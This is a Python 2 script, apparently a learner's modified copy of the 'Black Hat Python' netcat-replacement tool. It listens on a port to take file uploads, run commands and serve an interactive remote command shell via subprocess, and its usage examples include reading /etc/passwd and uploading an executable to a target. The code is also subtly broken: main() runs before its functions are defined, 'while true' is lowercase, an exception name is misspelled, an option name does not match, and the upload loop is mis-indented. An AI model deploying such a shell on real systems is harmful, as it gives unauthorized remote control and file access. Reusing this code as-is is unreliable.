#!/usr/bin/python

import sys
import socket
import getopt
import threading
import subprocess

# Define Global variables

listen			= False
command			= False
upload			= False
execute			= ""
target			= ""
upload_destination	= ""
port			= 0

#Main function responsible for handeling CLA and functions

def usage():
	print "BHP Net Tool"
	print "To replace the Ncat utility"
	print "Mostly taken from 'Blackhat - Python'"
	print "Modified by Myself for functionalitity"
	print
	print "Usage bhpnet.py -t target_host -p port"
	print
	print "-l --listen			- listen on [host]:[port] for incoming connections"
	print "-e --execute-file_to_run 	- execute the given file upon receiving a connection"
	print "-c --command 			- initalize a command shell"
	print "-u --upload=destination  	- upon receiving connection upload a file and write to [destination]"
	print
	print
	print "Examples: "
	print
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
	print "echo 'WordsAndShit' | ./bhpnet.py -t 192.168.11.12 -p 135"
	sys.exit(0)

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	#read commandline arguments

	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
		["help","listen","execute","target","port","command","upload"])
	except getopt.GetopError as err:
		print str(err)
		usage()


	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--commandshell"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"

	# Are going to listen or just send data from stdin?
	if not listen and len(target) and port > 0:
		#read the buffer from commandline
		#this will block, so send CTRL-D 
		#if not sending input to STDIN
		buffer = sys.stdin.read()
		#send data off
		client_sender(buffer)
		#We are going to listen and potentially upload things, exe cmds,
		#and drop a shell back
		#depending on the options above
	if listen:
		server_loop()
main()

		# (Above)(Besides imports) 1. Reading cmd line options
		# 2. setting variables 3. mime ncat readfrom stdin and send across network
		# 4. Determine we are set up to a listening socket and if we upload, exe etc

def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:

		#connect to target host
		client.connect((target,port))

		if len(buffer):
			client.send(buffer)

		while True:

			#now wait for data back
			recv_len = 1
			response = ""

			while recv_len:

				data 	 = client.recv(4096)
				recv_len = len(data)
				response+= data


				if recv_len < 4096:
					break

			print response,

			#wait for more input
			buffer = raw_input("")
			buffer += "\n"

			#send it off
			client.send(buffer)


	except:

		print "[*] Exception! Exiting"

		#tear down the connection
		client.close()

		# Above checking tcp socket sending some info see if we get output continue until user stops

def server_loop():
	global target

	#if no target is identified, we listen on all devices
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# spin off a thread to handle our new client
		client_thread = threading.Thread(target=client_handler,
		args=(client_socket,))
		client_thread.start()

def run_command(command):

	#trim the new line
	command=command.rstrip()

	#run the command and get output back
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"

	#send output back to the client
	return output

def client_handler(client_socket):
	global upload
	global execute
	global command

	#check for upload
	if len(upload_destination):

		#read in all of the bytes and write to destination
		file_buffer = ""

		# keep reading data until none is available
	while true:
		data = client_socket.recv(1024)

		if not data:
			break

		else:
			file_buffer += data

	#now we take the bytes and try to write them out
	try:
		file_descriptor = open(upload_destination,"wb")
		file_descriptor.write(file_buffer)
		file_descriptor.close()

		#Acknowledge that we wrote the file out
		client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

	except:
		client_socket.send("Failed to save file to %s\r\n" % upload_destination)


	#Check for command ececution
	if len(execute):

		#run the command
		output = run_command(execute)

		client_socket.send(output)

	#We go to another loop if a command shell was requested

	if command:

		while True:
			#show simple prompt
			client_socket.send("<BHP:#> ")

				#now we recieve until we see line feed (enter key)
				#(enter key)
			cmd_buffer = ""
			while "\n" not in  cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			# send back  the command output
			response = run_command(cmd_buffer)

			# send back thr response
			client_socket.send(response)

